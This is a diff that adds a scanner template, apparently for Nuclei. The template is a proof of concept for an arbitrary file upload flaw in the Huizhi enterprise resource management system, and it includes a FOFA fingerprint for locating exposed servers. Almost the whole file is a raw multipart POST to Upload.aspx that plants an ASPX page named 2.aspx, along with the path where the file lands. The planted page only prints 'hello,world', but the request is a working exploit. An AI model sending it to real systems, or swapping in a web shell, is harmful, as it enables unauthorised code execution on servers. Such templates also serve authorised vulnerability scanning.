@@ -1,0 +1,19 @@
+id: poc-bu8uxqyttiutagrz
+info:
+  name: 汇智企业资源管理系统存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bu8uxqyttiutagrz'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bu8uxqyttiutagrz
+    fofa: icon_hash="-642591392"
+http:
+- raw:
+  - "POST /nssys/common/Upload.aspx?Action=DNPageAjaxPostBack HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 1033\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary= ----WebKitFormBoundaryLkkAXATqVKBHZ8zk\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\n/wEPDwUJOTc0NzkxMzQ1D2QWAgIDDxYGHhdJc0JlZm9yZU9wZXJhdGVTYXZlRGF0YWgeBmlzZ3VpZAUBMR4OY2hlY2tmb3Jtc3RhdGUFATBkZHwobq1hNj9MTgjOtrIn/0gbCdhD\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\n\n573D6CFB\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk\nContent-Disposition: form-data; name=\"upfile_Input\"\n\n\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk\nContent-Disposition: form-data; name=\"upfile_upload\"; filename=\"1\"\nContent-Type: image/jpeg\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>ASP.NET Web Forms Example</title>\n</head>\n<body>\n    <%@ Page Language=\"C#\" %>\n    <% Response.Write(\"hello,world\"); %>\n</body>\n</html>\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk\nContent-Disposition: form-data; name=\"upfilename\"\n\n2.aspx\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk\nContent-Disposition: form-data; name=\"dnpostmethodname\"\n\nuploadfile\n------WebKitFormBoundaryLkkAXATqVKBHZ8zk--\n\n上传定位：http://ip/Upload/2024-08/2.aspx"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
